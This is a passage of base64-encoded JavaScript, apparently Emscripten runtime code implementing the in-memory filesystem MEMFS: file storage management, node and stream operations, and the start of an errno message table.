NhcGFjaXR5IHZzIHVzZWQgLXNjaGVtZS4NCiAgICAgICAgICBub2RlLmNvbnRlbnRzID0gbnVsbDsgDQogICAgICAgIH0gZWxzZSBpZiAoRlMuaXNMaW5rKG5vZGUubW9kZSkpIHsNCiAgICAgICAgICBub2RlLm5vZGVfb3BzID0gTUVNRlMub3BzX3RhYmxlLmxpbmsubm9kZTsNCiAgICAgICAgICBub2RlLnN0cmVhbV9vcHMgPSBNRU1GUy5vcHNfdGFibGUubGluay5zdHJlYW07DQogICAgICAgIH0gZWxzZSBpZiAoRlMuaXNDaHJkZXYobm9kZS5tb2RlKSkgew0KICAgICAgICAgIG5vZGUubm9kZV9vcHMgPSBNRU1GUy5vcHNfdGFibGUuY2hyZGV2Lm5vZGU7DQogICAgICAgICAgbm9kZS5zdHJlYW1fb3BzID0gTUVNRlMub3BzX3RhYmxlLmNocmRldi5zdHJlYW07DQogICAgICAgIH0NCiAgICAgICAgbm9kZS50aW1lc3RhbXAgPSBEYXRlLm5vdygpOw0KICAgICAgICAvLyBhZGQgdGhlIG5ldyBub2RlIHRvIHRoZSBwYXJlbnQNCiAgICAgICAgaWYgKHBhcmVudCkgew0KICAgICAgICAgIHBhcmVudC5jb250ZW50c1tuYW1lXSA9IG5vZGU7DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuIG5vZGU7DQogICAgICB9LGdldEZpbGVEYXRhQXNSZWd1bGFyQXJyYXk6ZnVuY3Rpb24obm9kZSkgew0KICAgICAgICBpZiAobm9kZS5jb250ZW50cyAmJiBub2RlLmNvbnRlbnRzLnN1YmFycmF5KSB7DQogICAgICAgICAgdmFyIGFyciA9IFtdOw0KICAgICAgICAgIGZvciAodmFyIGkgPSAwOyBpIDwgbm9kZS51c2VkQnl0ZXM7ICsraSkgYXJyLnB1c2gobm9kZS5jb250ZW50c1tpXSk7DQogICAgICAgICAgcmV0dXJuIGFycjsgLy8gUmV0dXJucyBhIGNvcHkgb2YgdGhlIG9yaWdpbmFsIGRhdGEuDQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuIG5vZGUuY29udGVudHM7IC8vIE5vLW9wLCB0aGUgZmlsZSBjb250ZW50cyBhcmUgYWxyZWFkeSBpbiBhIEpTIGFycmF5LiBSZXR1cm4gYXMtaXMuDQogICAgICB9LGdldEZpbGVEYXRhQXNUeXBlZEFycmF5OmZ1bmN0aW9uKG5vZGUpIHsNCiAgICAgICAgaWYgKCFub2RlLmNvbnRlbnRzKSByZXR1cm4gbmV3IFVpbnQ4QXJyYXkoMCk7DQogICAgICAgIGlmIChub2RlLmNvbnRlbnRzLnN1YmFycmF5KSByZXR1cm4gbm9kZS5jb250ZW50cy5zdWJhcnJheSgwLCBub2RlLnVzZWRCeXRlcyk7IC8vIE1ha2Ugc3VyZSB0byBub3QgcmV0dXJuIGV4Y2VzcyB1bnVzZWQgYnl0ZXMuDQogICAgICAgIHJldHVybiBuZXcgVWludDhBcnJheShub2RlLmNvbnRlbnRzKTsNCiAgICAgIH0sZXhwYW5kRmlsZVN0b3JhZ2U6ZnVuY3Rpb24obm9kZSwgbmV3Q2FwYWNpdHkpIHsNCiAgICAgICAgdmFyIHByZXZDYXBhY2l0eSA9IG5vZGUuY29udGVudHMgPyBub2RlLmNvbnRlbnRzLmxlbmd0aCA6IDA7DQogICAgICAgIGlmIChwcmV2Q2FwYWNpdHkgPj0gbmV3Q2FwYWNpdHkpIHJldHVybjsgLy8gTm8gbmVlZCB0byBleHBhbmQsIHRoZSBzdG9yYWdlIHdhcyBhbHJlYWR5IGxhcmdlIGVub3VnaC4NCiAgICAgICAgLy8gRG9uJ3QgZXhwYW5kIHN0cmljdGx5IHRvIHRoZSBnaXZlbiByZXF1ZXN0ZWQgbGltaXQgaWYgaXQncyBvbmx5IGEgdmVyeSBzbWFsbCBpbmNyZWFzZSwgYnV0IGluc3RlYWQgZ2VvbWV0cmljYWxseSBncm93IGNhcGFjaXR5Lg0KICAgICAgICAvLyBGb3Igc21hbGwgZmlsZXNpemVzICg8MU1CKSwgcGVyZm9ybSBzaXplKjIgZ2VvbWV0cmljIGluY3JlYXNlLCBidXQgZm9yIGxhcmdlIHNpemVzLCBkbyBhIG11Y2ggbW9yZSBjb25zZXJ2YXRpdmUgc2l6ZSoxLjEyNSBpbmNyZWFzZSB0bw0KICAgICAgICAvLyBhdm9pZCBvdmVyc2hvb3RpbmcgdGhlIGFsbG9jYXRpb24gY2FwIGJ5IGEgdmVyeSBsYXJnZSBtYXJnaW4uDQogICAgICAgIHZhciBDQVBBQ0lUWV9ET1VCTElOR19NQVggPSAxMDI0ICogMTAyNDsNCiAgICAgICAgbmV3Q2FwYWNpdHkgPSBNYXRoLm1heChuZXdDYXBhY2l0eSwgKHByZXZDYXBhY2l0eSAqIChwcmV2Q2FwYWNpdHkgPCBDQVBBQ0lUWV9ET1VCTElOR19NQVggPyAyLjAgOiAxLjEyNSkpID4+PiAwKTsNCiAgICAgICAgaWYgKHByZXZDYXBhY2l0eSAhPSAwKSBuZXdDYXBhY2l0eSA9IE1hdGgubWF4KG5ld0NhcGFjaXR5LCAyNTYpOyAvLyBBdCBtaW5pbXVtIGFsbG9jYXRlIDI1NmIgZm9yIGVhY2ggZmlsZSB3aGVuIGV4cGFuZGluZy4NCiAgICAgICAgdmFyIG9sZENvbnRlbnRzID0gbm9kZS5jb250ZW50czsNCiAgICAgICAgbm9kZS5jb250ZW50cyA9IG5ldyBVaW50OEFycmF5KG5ld0NhcGFjaXR5KTsgLy8gQWxsb2NhdGUgbmV3IHN0b3JhZ2UuDQogICAgICAgIGlmIChub2RlLnVzZWRCeXRlcyA+IDApIG5vZGUuY29udGVudHMuc2V0KG9sZENvbnRlbnRzLnN1YmFycmF5KDAsIG5vZGUudXNlZEJ5dGVzKSwgMCk7IC8vIENvcHkgb2xkIGRhdGEgb3ZlciB0byB0aGUgbmV3IHN0b3JhZ2UuDQogICAgICAgIHJldHVybjsNCiAgICAgIH0scmVzaXplRmlsZVN0b3JhZ2U6ZnVuY3Rpb24obm9kZSwgbmV3U2l6ZSkgew0KICAgICAgICBpZiAobm9kZS51c2VkQnl0ZXMgPT0gbmV3U2l6ZSkgcmV0dXJuOw0KICAgICAgICBpZiAobmV3U2l6ZSA9PSAwKSB7DQogICAgICAgICAgbm9kZS5jb250ZW50cyA9IG51bGw7IC8vIEZ1bGx5IGRlY29tbWl0IHdoZW4gcmVxdWVzdGluZyBhIHJlc2l6ZSB0byB6ZXJvLg0KICAgICAgICAgIG5vZGUudXNlZEJ5dGVzID0gMDsNCiAgICAgICAgICByZXR1cm47DQogICAgICAgIH0NCiAgICAgICAgaWYgKCFub2RlLmNvbnRlbnRzIHx8IG5vZGUuY29udGVudHMuc3ViYXJyYXkpIHsgLy8gUmVzaXplIGEgdHlwZWQgYXJyYXkgaWYgdGhhdCBpcyBiZWluZyB1c2VkIGFzIHRoZSBiYWNraW5nIHN0b3JlLg0KICAgICAgICAgIHZhciBvbGRDb250ZW50cyA9IG5vZGUuY29udGVudHM7DQogICAgICAgICAgbm9kZS5jb250ZW50cyA9IG5ldyBVaW50OEFycmF5KG5ld1NpemUpOyAvLyBBbGxvY2F0ZSBuZXcgc3RvcmFnZS4NCiAgICAgICAgICBpZiAob2xkQ29udGVudHMpIHsNCiAgICAgICAgICAgIG5vZGUuY29udGVudHMuc2V0KG9sZENvbnRlbnRzLnN1YmFycmF5KDAsIE1hdGgubWluKG5ld1NpemUsIG5vZGUudXNlZEJ5dGVzKSkpOyAvLyBDb3B5IG9sZCBkYXRhIG92ZXIgdG8gdGhlIG5ldyBzdG9yYWdlLg0KICAgICAgICAgIH0NCiAgICAgICAgICBub2RlLnVzZWRCeXRlcyA9IG5ld1NpemU7DQogICAgICAgICAgcmV0dXJuOw0KICAgICAgICB9DQogICAgICAgIC8vIEJhY2tpbmcgd2l0aCBhIEpTIGFycmF5Lg0KICAgICAgICBpZiAoIW5vZGUuY29udGVudHMpIG5vZGUuY29udGVudHMgPSBbXTsNCiAgICAgICAgaWYgKG5vZGUuY29udGVudHMubGVuZ3RoID4gbmV3U2l6ZSkgbm9kZS5jb250ZW50cy5sZW5ndGggPSBuZXdTaXplOw0KICAgICAgICBlbHNlIHdoaWxlIChub2RlLmNvbnRlbnRzLmxlbmd0aCA8IG5ld1NpemUpIG5vZGUuY29udGVudHMucHVzaCgwKTsNCiAgICAgICAgbm9kZS51c2VkQnl0ZXMgPSBuZXdTaXplOw0KICAgICAgfSxub2RlX29wczp7Z2V0YXR0cjpmdW5jdGlvbihub2RlKSB7DQogICAgICAgICAgdmFyIGF0dHIgPSB7fTsNCiAgICAgICAgICAvLyBkZXZpY2UgbnVtYmVycyByZXVzZSBpbm9kZSBudW1iZXJzLg0KICAgICAgICAgIGF0dHIuZGV2ID0gRlMuaXNDaHJkZXYobm9kZS5tb2RlKSA/IG5vZGUuaWQgOiAxOw0KICAgICAgICAgIGF0dHIuaW5vID0gbm9kZS5pZDsNCiAgICAgICAgICBhdHRyLm1vZGUgPSBub2RlLm1vZGU7DQogICAgICAgICAgYXR0ci5ubGluayA9IDE7DQogICAgICAgICAgYXR0ci51aWQgPSAwOw0KICAgICAgICAgIGF0dHIuZ2lkID0gMDsNCiAgICAgICAgICBhdHRyLnJkZXYgPSBub2RlLnJkZXY7DQogICAgICAgICAgaWYgKEZTLmlzRGlyKG5vZGUubW9kZSkpIHsNCiAgICAgICAgICAgIGF0dHIuc2l6ZSA9IDQwOTY7DQogICAgICAgICAgfSBlbHNlIGlmIChGUy5pc0ZpbGUobm9kZS5tb2RlKSkgew0KICAgICAgICAgICAgYXR0ci5zaXplID0gbm9kZS51c2VkQnl0ZXM7DQogICAgICAgICAgfSBlbHNlIGlmIChGUy5pc0xpbmsobm9kZS5tb2RlKSkgew0KICAgICAgICAgICAgYXR0ci5zaXplID0gbm9kZS5saW5rLmxlbmd0aDsNCiAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgYXR0ci5zaXplID0gMDsNCiAgICAgICAgICB9DQogICAgICAgICAgYXR0ci5hdGltZSA9IG5ldyBEYXRlKG5vZGUudGltZXN0YW1wKTsNCiAgICAgICAgICBhdHRyLm10aW1lID0gbmV3IERhdGUobm9kZS50aW1lc3RhbXApOw0KICAgICAgICAgIGF0dHIuY3RpbWUgPSBuZXcgRGF0ZShub2RlLnRpbWVzdGFtcCk7DQogICAgICAgICAgLy8gTk9URTogSW4gb3VyIGltcGxlbWVudGF0aW9uLCBzdF9ibG9ja3MgPSBNYXRoLmNlaWwoc3Rfc2l6ZS9zdF9ibGtzaXplKSwNCiAgICAgICAgICAvLyAgICAgICBidXQgdGhpcyBpcyBub3QgcmVxdWlyZWQgYnkgdGhlIHN0YW5kYXJkLg0KICAgICAgICAgIGF0dHIuYmxrc2l6ZSA9IDQwOTY7DQogICAgICAgICAgYXR0ci5ibG9ja3MgPSBNYXRoLmNlaWwoYXR0ci5zaXplIC8gYXR0ci5ibGtzaXplKTsNCiAgICAgICAgICByZXR1cm4gYXR0cjsNCiAgICAgICAgfSxzZXRhdHRyOmZ1bmN0aW9uKG5vZGUsIGF0dHIpIHsNCiAgICAgICAgICBpZiAoYXR0ci5tb2RlICE9PSB1bmRlZmluZWQpIHsNCiAgICAgICAgICAgIG5vZGUubW9kZSA9IGF0dHIubW9kZTsNCiAgICAgICAgICB9DQogICAgICAgICAgaWYgKGF0dHIudGltZXN0YW1wICE9PSB1bmRlZmluZWQpIHsNCiAgICAgICAgICAgIG5vZGUudGltZXN0YW1wID0gYXR0ci50aW1lc3RhbXA7DQogICAgICAgICAgfQ0KICAgICAgICAgIGlmIChhdHRyLnNpemUgIT09IHVuZGVmaW5lZCkgew0KICAgICAgICAgICAgTUVNRlMucmVzaXplRmlsZVN0b3JhZ2Uobm9kZSwgYXR0ci5zaXplKTsNCiAgICAgICAgICB9DQogICAgICAgIH0sbG9va3VwOmZ1bmN0aW9uKHBhcmVudCwgbmFtZSkgew0KICAgICAgICAgIHRocm93IEZTLmdlbmVyaWNFcnJvcnNbNDRdOw0KICAgICAgICB9LG1rbm9kOmZ1bmN0aW9uKHBhcmVudCwgbmFtZSwgbW9kZSwgZGV2KSB7DQogICAgICAgICAgcmV0dXJuIE1FTUZTLmNyZWF0ZU5vZGUocGFyZW50LCBuYW1lLCBtb2RlLCBkZXYpOw0KICAgICAgICB9LHJlbmFtZTpmdW5jdGlvbihvbGRfbm9kZSwgbmV3X2RpciwgbmV3X25hbWUpIHsNCiAgICAgICAgICAvLyBpZiB3ZSdyZSBvdmVyd3JpdGluZyBhIGRpcmVjdG9yeSBhdCBuZXdfbmFtZSwgbWFrZSBzdXJlIGl0J3MgZW1wdHkuDQogICAgICAgICAgaWYgKEZTLmlzRGlyKG9sZF9ub2RlLm1vZGUpKSB7DQogICAgICAgICAgICB2YXIgbmV3X25vZGU7DQogICAgICAgICAgICB0cnkgew0KICAgICAgICAgICAgICBuZXdfbm9kZSA9IEZTLmxvb2t1cE5vZGUobmV3X2RpciwgbmV3X25hbWUpOw0KICAgICAgICAgICAgfSBjYXRjaCAoZSkgew0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgaWYgKG5ld19ub2RlKSB7DQogICAgICAgICAgICAgIGZvciAodmFyIGkgaW4gbmV3X25vZGUuY29udGVudHMpIHsNCiAgICAgICAgICAgICAgICB0aHJvdyBuZXcgRlMuRXJybm9FcnJvcig1NSk7DQogICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgICB9DQogICAgICAgICAgLy8gZG8gdGhlIGludGVybmFsIHJld2lyaW5nDQogICAgICAgICAgZGVsZXRlIG9sZF9ub2RlLnBhcmVudC5jb250ZW50c1tvbGRfbm9kZS5uYW1lXTsNCiAgICAgICAgICBvbGRfbm9kZS5uYW1lID0gbmV3X25hbWU7DQogICAgICAgICAgbmV3X2Rpci5jb250ZW50c1tuZXdfbmFtZV0gPSBvbGRfbm9kZTsNCiAgICAgICAgICBvbGRfbm9kZS5wYXJlbnQgPSBuZXdfZGlyOw0KICAgICAgICB9LHVubGluazpmdW5jdGlvbihwYXJlbnQsIG5hbWUpIHsNCiAgICAgICAgICBkZWxldGUgcGFyZW50LmNvbnRlbnRzW25hbWVdOw0KICAgICAgICB9LHJtZGlyOmZ1bmN0aW9uKHBhcmVudCwgbmFtZSkgew0KICAgICAgICAgIHZhciBub2RlID0gRlMubG9va3VwTm9kZShwYXJlbnQsIG5hbWUpOw0KICAgICAgICAgIGZvciAodmFyIGkgaW4gbm9kZS5jb250ZW50cykgew0KICAgICAgICAgICAgdGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoNTUpOw0KICAgICAgICAgIH0NCiAgICAgICAgICBkZWxldGUgcGFyZW50LmNvbnRlbnRzW25hbWVdOw0KICAgICAgICB9LHJlYWRkaXI6ZnVuY3Rpb24obm9kZSkgew0KICAgICAgICAgIHZhciBlbnRyaWVzID0gWycuJywgJy4uJ107DQogICAgICAgICAgZm9yICh2YXIga2V5IGluIG5vZGUuY29udGVudHMpIHsNCiAgICAgICAgICAgIGlmICghbm9kZS5jb250ZW50cy5oYXNPd25Qcm9wZXJ0eShrZXkpKSB7DQogICAgICAgICAgICAgIGNvbnRpbnVlOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgZW50cmllcy5wdXNoKGtleSk7DQogICAgICAgICAgfQ0KICAgICAgICAgIHJldHVybiBlbnRyaWVzOw0KICAgICAgICB9LHN5bWxpbms6ZnVuY3Rpb24ocGFyZW50LCBuZXduYW1lLCBvbGRwYXRoKSB7DQogICAgICAgICAgdmFyIG5vZGUgPSBNRU1GUy5jcmVhdGVOb2RlKHBhcmVudCwgbmV3bmFtZSwgNTExIC8qIDA3NzcgKi8gfCA0MDk2MCwgMCk7DQogICAgICAgICAgbm9kZS5saW5rID0gb2xkcGF0aDsNCiAgICAgICAgICByZXR1cm4gbm9kZTsNCiAgICAgICAgfSxyZWFkbGluazpmdW5jdGlvbihub2RlKSB7DQogICAgICAgICAgaWYgKCFGUy5pc0xpbmsobm9kZS5tb2RlKSkgew0KICAgICAgICAgICAgdGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoMjgpOw0KICAgICAgICAgIH0NCiAgICAgICAgICByZXR1cm4gbm9kZS5saW5rOw0KICAgICAgICB9fSxzdHJlYW1fb3BzOntyZWFkOmZ1bmN0aW9uKHN0cmVhbSwgYnVmZmVyLCBvZmZzZXQsIGxlbmd0aCwgcG9zaXRpb24pIHsNCiAgICAgICAgICB2YXIgY29udGVudHMgPSBzdHJlYW0ubm9kZS5jb250ZW50czsNCiAgICAgICAgICBpZiAocG9zaXRpb24gPj0gc3RyZWFtLm5vZGUudXNlZEJ5dGVzKSByZXR1cm4gMDsNCiAgICAgICAgICB2YXIgc2l6ZSA9IE1hdGgubWluKHN0cmVhbS5ub2RlLnVzZWRCeXRlcyAtIHBvc2l0aW9uLCBsZW5ndGgpOw0KICAgICAgICAgIGFzc2VydChzaXplID49IDApOw0KICAgICAgICAgIGlmIChzaXplID4gOCAmJiBjb250ZW50cy5zdWJhcnJheSkgeyAvLyBub24tdHJpdmlhbCwgYW5kIHR5cGVkIGFycmF5DQogICAgICAgICAgICBidWZmZXIuc2V0KGNvbnRlbnRzLnN1YmFycmF5KHBvc2l0aW9uLCBwb3NpdGlvbiArIHNpemUpLCBvZmZzZXQpOw0KICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICBmb3IgKHZhciBpID0gMDsgaSA8IHNpemU7IGkrKykgYnVmZmVyW29mZnNldCArIGldID0gY29udGVudHNbcG9zaXRpb24gKyBpXTsNCiAgICAgICAgICB9DQogICAgICAgICAgcmV0dXJuIHNpemU7DQogICAgICAgIH0sd3JpdGU6ZnVuY3Rpb24oc3RyZWFtLCBidWZmZXIsIG9mZnNldCwgbGVuZ3RoLCBwb3NpdGlvbiwgY2FuT3duKSB7DQogICAgICAgICAgLy8gVGhlIGRhdGEgYnVmZmVyIHNob3VsZCBiZSBhIHR5cGVkIGFycmF5IHZpZXcNCiAgICAgICAgICBhc3NlcnQoIShidWZmZXIgaW5zdGFuY2VvZiBBcnJheUJ1ZmZlcikpOw0KICANCiAgICAgICAgICBpZiAoIWxlbmd0aCkgcmV0dXJuIDA7DQogICAgICAgICAgdmFyIG5vZGUgPSBzdHJlYW0ubm9kZTsNCiAgICAgICAgICBub2RlLnRpbWVzdGFtcCA9IERhdGUubm93KCk7DQogIA0KICAgICAgICAgIGlmIChidWZmZXIuc3ViYXJyYXkgJiYgKCFub2RlLmNvbnRlbnRzIHx8IG5vZGUuY29udGVudHMuc3ViYXJyYXkpKSB7IC8vIFRoaXMgd3JpdGUgaXMgZnJvbSBhIHR5cGVkIGFycmF5IHRvIGEgdHlwZWQgYXJyYXk/DQogICAgICAgICAgICBpZiAoY2FuT3duKSB7DQogICAgICAgICAgICAgIGFzc2VydChwb3NpdGlvbiA9PT0gMCwgJ2Nhbk93biBtdXN0IGltcGx5IG5vIHdlaXJkIHBvc2l0aW9uIGluc2lkZSB0aGUgZmlsZScpOw0KICAgICAgICAgICAgICBub2RlLmNvbnRlbnRzID0gYnVmZmVyLnN1YmFycmF5KG9mZnNldCwgb2Zmc2V0ICsgbGVuZ3RoKTsNCiAgICAgICAgICAgICAgbm9kZS51c2VkQnl0ZXMgPSBsZW5ndGg7DQogICAgICAgICAgICAgIHJldHVybiBsZW5ndGg7DQogICAgICAgICAgICB9IGVsc2UgaWYgKG5vZGUudXNlZEJ5dGVzID09PSAwICYmIHBvc2l0aW9uID09PSAwKSB7IC8vIElmIHRoaXMgaXMgYSBzaW1wbGUgZmlyc3Qgd3JpdGUgdG8gYW4gZW1wdHkgZmlsZSwgZG8gYSBmYXN0IHNldCBzaW5jZSB3ZSBkb24ndCBuZWVkIHRvIGNhcmUgYWJvdXQgb2xkIGRhdGEuDQogICAgICAgICAgICAgIG5vZGUuY29udGVudHMgPSBidWZmZXIuc2xpY2Uob2Zmc2V0LCBvZmZzZXQgKyBsZW5ndGgpOw0KICAgICAgICAgICAgICBub2RlLnVzZWRCeXRlcyA9IGxlbmd0aDsNCiAgICAgICAgICAgICAgcmV0dXJuIGxlbmd0aDsNCiAgICAgICAgICAgIH0gZWxzZSBpZiAocG9zaXRpb24gKyBsZW5ndGggPD0gbm9kZS51c2VkQnl0ZXMpIHsgLy8gV3JpdGluZyB0byBhbiBhbHJlYWR5IGFsbG9jYXRlZCBhbmQgdXNlZCBzdWJyYW5nZSBvZiB0aGUgZmlsZT8NCiAgICAgICAgICAgICAgbm9kZS5jb250ZW50cy5zZXQoYnVmZmVyLnN1YmFycmF5KG9mZnNldCwgb2Zmc2V0ICsgbGVuZ3RoKSwgcG9zaXRpb24pOw0KICAgICAgICAgICAgICByZXR1cm4gbGVuZ3RoOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgIH0NCiAgDQogICAgICAgICAgLy8gQXBwZW5kaW5nIHRvIGFuIGV4aXN0aW5nIGZpbGUgYW5kIHdlIG5lZWQgdG8gcmVhbGxvY2F0ZSwgb3Igc291cmNlIGRhdGEgZGlkIG5vdCBjb21lIGFzIGEgdHlwZWQgYXJyYXkuDQogICAgICAgICAgTUVNRlMuZXhwYW5kRmlsZVN0b3JhZ2Uobm9kZSwgcG9zaXRpb24rbGVuZ3RoKTsNCiAgICAgICAgICBpZiAobm9kZS5jb250ZW50cy5zdWJhcnJheSAmJiBidWZmZXIuc3ViYXJyYXkpIG5vZGUuY29udGVudHMuc2V0KGJ1ZmZlci5zdWJhcnJheShvZmZzZXQsIG9mZnNldCArIGxlbmd0aCksIHBvc2l0aW9uKTsgLy8gVXNlIHR5cGVkIGFycmF5IHdyaXRlIGlmIGF2YWlsYWJsZS4NCiAgICAgICAgICBlbHNlIHsNCiAgICAgICAgICAgIGZvciAodmFyIGkgPSAwOyBpIDwgbGVuZ3RoOyBpKyspIHsNCiAgICAgICAgICAgICBub2RlLmNvbnRlbnRzW3Bvc2l0aW9uICsgaV0gPSBidWZmZXJbb2Zmc2V0ICsgaV07IC8vIE9yIGZhbGwgYmFjayB0byBtYW51YWwgd3JpdGUgaWYgbm90Lg0KICAgICAgICAgICAgfQ0KICAgICAgICAgIH0NCiAgICAgICAgICBub2RlLnVzZWRCeXRlcyA9IE1hdGgubWF4KG5vZGUudXNlZEJ5dGVzLCBwb3NpdGlvbiArIGxlbmd0aCk7DQogICAgICAgICAgcmV0dXJuIGxlbmd0aDsNCiAgICAgICAgfSxsbHNlZWs6ZnVuY3Rpb24oc3RyZWFtLCBvZmZzZXQsIHdoZW5jZSkgew0KICAgICAgICAgIHZhciBwb3NpdGlvbiA9IG9mZnNldDsNCiAgICAgICAgICBpZiAod2hlbmNlID09PSAxKSB7DQogICAgICAgICAgICBwb3NpdGlvbiArPSBzdHJlYW0ucG9zaXRpb247DQogICAgICAgICAgfSBlbHNlIGlmICh3aGVuY2UgPT09IDIpIHsNCiAgICAgICAgICAgIGlmIChGUy5pc0ZpbGUoc3RyZWFtLm5vZGUubW9kZSkpIHsNCiAgICAgICAgICAgICAgcG9zaXRpb24gKz0gc3RyZWFtLm5vZGUudXNlZEJ5dGVzOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgIH0NCiAgICAgICAgICBpZiAocG9zaXRpb24gPCAwKSB7DQogICAgICAgICAgICB0aHJvdyBuZXcgRlMuRXJybm9FcnJvcigyOCk7DQogICAgICAgICAgfQ0KICAgICAgICAgIHJldHVybiBwb3NpdGlvbjsNCiAgICAgICAgfSxhbGxvY2F0ZTpmdW5jdGlvbihzdHJlYW0sIG9mZnNldCwgbGVuZ3RoKSB7DQogICAgICAgICAgTUVNRlMuZXhwYW5kRmlsZVN0b3JhZ2Uoc3RyZWFtLm5vZGUsIG9mZnNldCArIGxlbmd0aCk7DQogICAgICAgICAgc3RyZWFtLm5vZGUudXNlZEJ5dGVzID0gTWF0aC5tYXgoc3RyZWFtLm5vZGUudXNlZEJ5dGVzLCBvZmZzZXQgKyBsZW5ndGgpOw0KICAgICAgICB9LG1tYXA6ZnVuY3Rpb24oc3RyZWFtLCBhZGRyZXNzLCBsZW5ndGgsIHBvc2l0aW9uLCBwcm90LCBmbGFncykgew0KICAgICAgICAgIC8vIFdlIGRvbid0IGN1cnJlbnRseSBzdXBwb3J0IGxvY2F0aW9uIGhpbnRzIGZvciB0aGUgYWRkcmVzcyBvZiB0aGUgbWFwcGluZw0KICAgICAgICAgIGFzc2VydChhZGRyZXNzID09PSAwKTsNCiAgDQogICAgICAgICAgaWYgKCFGUy5pc0ZpbGUoc3RyZWFtLm5vZGUubW9kZSkpIHsNCiAgICAgICAgICAgIHRocm93IG5ldyBGUy5FcnJub0Vycm9yKDQzKTsNCiAgICAgICAgICB9DQogICAgICAgICAgdmFyIHB0cjsNCiAgICAgICAgICB2YXIgYWxsb2NhdGVkOw0KICAgICAgICAgIHZhciBjb250ZW50cyA9IHN0cmVhbS5ub2RlLmNvbnRlbnRzOw0KICAgICAgICAgIC8vIE9ubHkgbWFrZSBhIG5ldyBjb3B5IHdoZW4gTUFQX1BSSVZBVEUgaXMgc3BlY2lmaWVkLg0KICAgICAgICAgIGlmICghKGZsYWdzICYgMikgJiYgY29udGVudHMuYnVmZmVyID09PSBidWZmZXIpIHsNCiAgICAgICAgICAgIC8vIFdlIGNhbid0IGVtdWxhdGUgTUFQX1NIQVJFRCB3aGVuIHRoZSBmaWxlIGlzIG5vdCBiYWNrZWQgYnkgdGhlIGJ1ZmZlcg0KICAgICAgICAgICAgLy8gd2UncmUgbWFwcGluZyB0byAoZS5nLiB0aGUgSEVBUCBidWZmZXIpLg0KICAgICAgICAgICAgYWxsb2NhdGVkID0gZmFsc2U7DQogICAgICAgICAgICBwdHIgPSBjb250ZW50cy5ieXRlT2Zmc2V0Ow0KICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAvLyBUcnkgdG8gYXZvaWQgdW5uZWNlc3Nhcnkgc2xpY2VzLg0KICAgICAgICAgICAgaWYgKHBvc2l0aW9uID4gMCB8fCBwb3NpdGlvbiArIGxlbmd0aCA8IGNvbnRlbnRzLmxlbmd0aCkgew0KICAgICAgICAgICAgICBpZiAoY29udGVudHMuc3ViYXJyYXkpIHsNCiAgICAgICAgICAgICAgICBjb250ZW50cyA9IGNvbnRlbnRzLnN1YmFycmF5KHBvc2l0aW9uLCBwb3NpdGlvbiArIGxlbmd0aCk7DQogICAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgY29udGVudHMgPSBBcnJheS5wcm90b3R5cGUuc2xpY2UuY2FsbChjb250ZW50cywgcG9zaXRpb24sIHBvc2l0aW9uICsgbGVuZ3RoKTsNCiAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgYWxsb2NhdGVkID0gdHJ1ZTsNCiAgICAgICAgICAgIHB0ciA9IF9tYWxsb2MobGVuZ3RoKTsNCiAgICAgICAgICAgIGlmICghcHRyKSB7DQogICAgICAgICAgICAgIHRocm93IG5ldyBGUy5FcnJub0Vycm9yKDQ4KTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIEhFQVA4LnNldChjb250ZW50cywgcHRyKTsNCiAgICAgICAgICB9DQogICAgICAgICAgcmV0dXJuIHsgcHRyOiBwdHIsIGFsbG9jYXRlZDogYWxsb2NhdGVkIH07DQogICAgICAgIH0sbXN5bmM6ZnVuY3Rpb24oc3RyZWFtLCBidWZmZXIsIG9mZnNldCwgbGVuZ3RoLCBtbWFwRmxhZ3MpIHsNCiAgICAgICAgICBpZiAoIUZTLmlzRmlsZShzdHJlYW0ubm9kZS5tb2RlKSkgew0KICAgICAgICAgICAgdGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoNDMpOw0KICAgICAgICAgIH0NCiAgICAgICAgICBpZiAobW1hcEZsYWdzICYgMikgew0KICAgICAgICAgICAgLy8gTUFQX1BSSVZBVEUgY2FsbHMgbmVlZCBub3QgdG8gYmUgc3luY2VkIGJhY2sgdG8gdW5kZXJseWluZyBmcw0KICAgICAgICAgICAgcmV0dXJuIDA7DQogICAgICAgICAgfQ0KICANCiAgICAgICAgICB2YXIgYnl0ZXNXcml0dGVuID0gTUVNRlMuc3RyZWFtX29wcy53cml0ZShzdHJlYW0sIGJ1ZmZlciwgMCwgbGVuZ3RoLCBvZmZzZXQsIGZhbHNlKTsNCiAgICAgICAgICAvLyBzaG91bGQgd2UgY2hlY2sgaWYgYnl0ZXNXcml0dGVuIGFuZCBsZW5ndGggYXJlIHRoZSBzYW1lPw0KICAgICAgICAgIHJldHVybiAwOw0KICAgICAgICB9fX07DQogIA0KICB2YXIgRVJSTk9fTUVTU0FHRVM9ezA6IlN1Y2Nlc3MiLDE6IkFyZyBsaXN0IHRvbyBsb25nIiwyOiJQZXJtaXNzaW9uIGRlbmllZCIsMzoiQWRkcmVzcyBhbHJlYWR5IGluIHVzZSIsNDoiQWRkcmVzcyBub3QgYXZhaWxhYmxlIiw1OiJBZGRyZXNzIGZhbWlseSBub3Qgc3VwcG9ydGVkIGJ5IHByb3RvY29sIGZhbWlseSIsNjoiTm8gbW9yZSBwcm9jZXNzZXMiLDc6IlNvY2tldCBhbHJlYWR5IGNvbm5lY3RlZCIsODoiQmFkIGZpbGUgbnVtYmVyIiw5OiJUcnlpbmcgdG8gcmVhZCB1bnJlYWRhYmxlIG1lc3NhZ2UiLDEwOiJNb3VudCBkZXZpY2UgYnVzeSIsMTE6Ik9wZXJhdGlvbiBjYW5jZWxlZCIsMTI6Ik5vIGNoaWxkcmVuIiwxMzoiQ29ubmVjdGlvbiBhYm9ydGVkIiwxNDoiQ29ubmVjdGlvbiByZWZ1c2VkIiwxN